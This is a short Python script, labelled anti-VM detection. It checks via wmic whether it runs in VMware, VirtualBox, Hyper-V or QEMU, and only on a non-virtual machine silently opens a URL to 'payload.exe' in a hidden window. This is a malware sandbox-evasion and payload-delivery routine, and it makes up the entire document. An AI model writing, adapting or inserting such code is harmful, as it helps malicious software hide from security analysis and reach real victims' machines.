# Anti-VM detection
import subprocess, sys

def check_vm():
    out = subprocess.run(["wmic", "computersystem", "get", "model"],
                         capture_output=True, text=True).stdout.lower()
    return any(k in out for k in ("vmware", "virtualbox", "vbox", "hyper-v", "qemu"))

if not check_vm():
    subprocess.Popen(["cmd", "/c", "start", "http://127.0.0.1/payload.exe"],
                     creationflags=subprocess.CREATE_NO_WINDOW)
